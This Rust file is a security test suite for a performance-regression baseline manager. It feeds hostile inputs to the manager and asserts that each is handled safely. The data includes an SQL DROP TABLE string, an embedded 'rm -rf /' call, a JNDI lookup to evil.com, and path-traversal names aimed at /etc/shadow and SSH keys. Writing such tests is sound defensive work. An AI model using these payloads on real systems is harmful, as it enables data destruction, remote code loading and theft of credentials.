//! # Advanced Security Tests for Performance Regression Detection
//!
//! Comprehensive security validation including threat model testing,
//! injection attacks, file system security, and denial of service protection.

use skreaver_testing::regression::{BaselineManager, PerformanceMeasurement};
use std::collections::HashMap;
use std::time::{Duration, SystemTime};
use tempfile::TempDir;

// Helper functions for test creation
fn create_test_measurement(
    name: &str,
    mean_micros: u64,
    std_dev_micros: u64,
    sample_count: usize,
) -> PerformanceMeasurement {
    use skreaver_testing::benchmarks::BenchmarkResult;

    let result = BenchmarkResult {
        name: name.to_string(),
        iterations: sample_count,
        mean: Duration::from_micros(mean_micros),
        median: Duration::from_micros(mean_micros),
        min: Duration::from_micros(mean_micros.saturating_sub(std_dev_micros)),
        max: Duration::from_micros(mean_micros + std_dev_micros),
        std_dev: Duration::from_micros(std_dev_micros),
        throughput: None,
        total_operations: None,
    };

    PerformanceMeasurement::from(result)
}

fn create_measurement_with_values(
    name: &str,
    mean_nanos: u64,
    median_nanos: u64,
    min_nanos: u64,
    max_nanos: u64,
    std_dev_nanos: u64,
    sample_count: usize,
) -> PerformanceMeasurement {
    PerformanceMeasurement {
        benchmark_name: name.to_string(),
        timestamp: SystemTime::now(),
        commit_hash: None,
        branch: None,
        mean_duration_nanos: mean_nanos,
        median_duration_nanos: median_nanos,
        min_duration_nanos: min_nanos,
        max_duration_nanos: max_nanos,
        std_dev_nanos,
        sample_count,
        throughput_ops_per_sec: None,
        custom_metrics: HashMap::new(),
    }
}

/// Test suite for advanced security scenarios
#[cfg(test)]
mod advanced_security_tests {
    use super::*;

    #[test]
    fn test_json_injection_attacks() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let mut manager = BaselineManager::new(temp_dir.path()).expect("Failed to create manager");

        // Test JSON injection in various fields
        let json_payloads = vec![
            r#"{"evil": "payload"}"#,
            r#"'; DROP TABLE IF EXISTS baselines; --"#,
            r#"\"; system('rm -rf /'); \""#,
            r#"${jndi:ldap://evil.com/exploit}"#,
        ];

        for payload in json_payloads {
            let measurement = PerformanceMeasurement {
                benchmark_name: payload.to_string(),
                timestamp: SystemTime::now(),
                commit_hash: Some(payload.to_string()),
                branch: Some(payload.to_string()),
                mean_duration_nanos: 1_000_000,
                median_duration_nanos: 1_000_000,
                min_duration_nanos: 900_000,
                max_duration_nanos: 1_100_000,
                std_dev_nanos: 50_000,
                sample_count: 100,
                throughput_ops_per_sec: None,
                custom_metrics: {
                    let mut metrics = HashMap::new();
                    metrics.insert(payload.to_string(), 42.0);
                    metrics
                },
            };

            // Should handle JSON injection attempts safely
            let result = manager.update_baseline(measurement);
            assert!(
                result.is_ok(),
                "Should safely handle JSON injection: {}",
                payload
            );
        }
    }

    #[test]
    fn test_filesystem_attack_vectors() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let mut manager = BaselineManager::new(temp_dir.path()).expect("Failed to create manager");

        // Test various filesystem attack vectors
        let malicious_names = vec![
            "../../../etc/shadow",       // Path traversal
            "..\\..\\windows\\system32", // Windows path traversal
            "/dev/null",                 // Device file
            "/proc/self/mem",            // Process memory
            "CON",                       // Windows reserved name
            "aux",                       // Windows reserved name
            "prn",                       // Windows reserved name
            ".git/config",               // Hidden git file
            ".ssh/id_rsa",               // SSH private key
        ];

        for malicious_name in malicious_names {
            let measurement = create_test_measurement(malicious_name, 1000, 10, 100);

            // System should handle malicious paths safely
            let result = manager.update_baseline(measurement);
            assert!(
                result.is_ok(),
                "Should safely handle malicious path: {}",
                malicious_name
            );

            // Verify no files were created outside temp directory (skip system files that already exist)
            if !malicious_name.starts_with("/dev/")
                && !malicious_name.starts_with("/proc/")
                && !malicious_name.contains(".git/")
                && !malicious_name.contains(".ssh/")
            {
                let path = std::path::Path::new(malicious_name);
                if path.is_relative() {
                    // For relative paths, check they weren't created in current directory
                    assert!(
                        !path.exists() || path.starts_with(temp_dir.path()),
                        "Should not create files outside temp directory: {}",
                        malicious_name
                    );
                }
            }
        }
    }

    #[test]
    fn test_memory_exhaustion_protection() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let mut manager = BaselineManager::new(temp_dir.path()).expect("Failed to create manager");

        // Test with measurements designed to exhaust memory
        let huge_custom_metrics = (0..1000)
            .map(|i| (format!("metric_{}", i), f64::MAX / 2.0))
            .collect::<HashMap<String, f64>>();

        let memory_bomb_measurement = PerformanceMeasurement {
            benchmark_name: "memory_test".to_string(),
            timestamp: SystemTime::now(),
            commit_hash: None,
            branch: None,
            mean_duration_nanos: u64::MAX / 2,
            median_duration_nanos: u64::MAX / 2,
            min_duration_nanos: u64::MAX / 4,
            max_duration_nanos: u64::MAX / 2,
            std_dev_nanos: u64::MAX / 10,
            sample_count: usize::MAX / 1000,
            throughput_ops_per_sec: Some(f64::MAX),
            custom_metrics: huge_custom_metrics,
        };

        // Should handle large data structures without crashing
        let result = manager.update_baseline(memory_bomb_measurement);
        assert!(result.is_ok(), "Should handle large data structures safely");
    }

    #[test]
    fn test_unicode_and_encoding_attacks() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let mut manager = BaselineManager::new(temp_dir.path()).expect("Failed to create manager");

        // Test various Unicode and encoding attack vectors
        let unicode_attacks = vec![
            "🚨💀DANGER💀🚨",           // Emojis
            "Ḧëłłö Wörłd",              // Accented characters
            "русский текст",            // Cyrillic
            "中文测试",                 // Chinese
            "اختبار عربي",              // Arabic
            "\u{202E}REVERSED\u{202D}", // Right-to-left override
            "\u{FEFF}BOM_TEST",         // Byte order mark
            "A_NULL_B",                 // Simplified null byte test
            "\x7F",                     // DEL character
        ];

        for unicode_text in unicode_attacks {
            let measurement = PerformanceMeasurement {
                benchmark_name: unicode_text.to_string(),
                timestamp: SystemTime::now(),
                commit_hash: Some(unicode_text.to_string()),
                branch: Some(unicode_text.to_string()),
                mean_duration_nanos: 1_000_000,
                median_duration_nanos: 1_000_000,
                min_duration_nanos: 900_000,
                max_duration_nanos: 1_100_000,
                std_dev_nanos: 50_000,
                sample_count: 100,
                throughput_ops_per_sec: None,
                custom_metrics: HashMap::new(),
            };

            // Should handle Unicode safely without breaking
            let result = manager.update_baseline(measurement);
            assert!(
                result.is_ok(),
                "Should handle Unicode safely: {}",
                unicode_text
            );
        }
    }

    #[test]
    fn test_concurrent_access_security() {
        use std::sync::{Arc, Mutex};
        use std::thread;

        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let manager = Arc::new(Mutex::new(
            BaselineManager::new(temp_dir.path()).expect("Failed to create manager"),
        ));

        // Simulate concurrent attacks from multiple threads
        let handles: Vec<_> = (0..10)
            .map(|thread_id| {
                let manager_clone = Arc::clone(&manager);
                thread::spawn(move || {
                    for i in 0..10 {
                        let malicious_name = format!("../attack_{}_{}", thread_id, i);
                        let measurement =
                            create_test_measurement(&malicious_name, 1000 + i, 10, 100);

                        if let Ok(mut manager_lock) = manager_clone.try_lock() {
                            let _result = manager_lock.update_baseline(measurement);
                            // Don't panic on errors in concurrent test - just log them
                        }

                        // Small delay to increase chance of race conditions
                        thread::sleep(Duration::from_millis(1));
                    }
                })
            })
            .collect();

        // Wait for all attack threads to complete
        for handle in handles {
            handle.join().expect("Attack thread should complete");
        }

        // System should remain stable after concurrent attacks
        let manager_lock = manager.lock().unwrap();
        assert!(manager_lock.list_baselines().len() <= 100); // Should not have created excessive baselines
    }

    #[test]
    fn test_disk_space_exhaustion_protection() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let mut manager = BaselineManager::new(temp_dir.path()).expect("Failed to create manager");

        // Attempt to create many baselines to test storage limits
        for i in 0..2000 {
            let measurement = create_test_measurement(&format!("disk_test_{}", i), 1000, 10, 100);
            let result = manager.update_baseline(measurement);

            if result.is_err() {
                // If we hit disk space or file limit issues, that's acceptable
                println!("Disk limit reached at iteration {}", i);
                break;
            }
        }

        // Verify baseline count is limited (memory protection kicks in)
        if let Some(baseline) = manager.get_baseline("disk_test_1999") {
            assert_eq!(baseline.measurements.len(), 1); // Each baseline should have limited measurements
        }
    }

    #[test]
    fn test_serialization_security() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");

        // Test with malicious serialized data
        let malicious_json = r#"{
            "benchmark_name": "test",
            "measurements": [],
            "created_at": {"secs_since_epoch": 18446744073709551615, "nanos_since_epoch": 4294967295},
            "updated_at": {"secs_since_epoch": 0, "nanos_since_epoch": 0}
        }"#;

        let malicious_file = temp_dir.path().join("malicious.json");
        std::fs::write(&malicious_file, malicious_json).expect("Failed to write malicious file");

        // Manager should handle malicious serialized data safely
        let manager = BaselineManager::new(temp_dir.path()).expect("Failed to create manager");

        // Should ignore malicious file due to parsing errors
        assert_eq!(manager.list_baselines().len(), 0);
    }

    #[test]
    fn test_statistical_manipulation_attacks() {
        let temp_dir = TempDir::new().expect("Failed to create temp directory");
        let mut manager = BaselineManager::new(temp_dir.path()).expect("Failed to create manager");

        // Build legitimate baseline
        for _ in 0..15 {
            let measurement = create_test_measurement("stats_attack_test", 1000, 10, 100);
            manager
                .update_baseline(measurement)
                .expect("Failed to build baseline");
        }

        // Attempt statistical manipulation with extreme values
        let attack_measurements = vec![
            create_measurement_with_values("stats_attack_test", 0, 0, 0, 0, 0, 1), // Zero values
            create_measurement_with_values(
                "stats_attack_test",
                u64::MAX,
                u64::MAX,
                u64::MAX,
                u64::MAX,
                u64::MAX,
                usize::MAX,
            ), // Max values
            create_measurement_with_values("stats_attack_test", 1, u64::MAX, 1, 1, u64::MAX, 1), // Extreme std dev
        ];

        for attack_measurement in attack_measurements {
            // System should handle statistical attacks gracefully
            let result = manager.detect_regression(&attack_measurement);
            assert!(
                result.is_ok(),
                "Should handle statistical manipulation safely"
            );

            // Analysis should not produce invalid results
            if let Ok(analysis) = result {
                assert!(
                    !analysis.mean_change_percent.is_nan(),
                    "Mean change should not be NaN"
                );
                assert!(
                    !analysis.mean_change_percent.is_infinite(),
                    "Mean change should not be infinite"
                );
                assert!(
                    !analysis.p95_change_percent.is_nan(),
                    "P95 change should not be NaN"
                );
                assert!(
                    !analysis.p99_change_percent.is_nan(),
                    "P99 change should not be NaN"
                );
            }
        }
    }
}
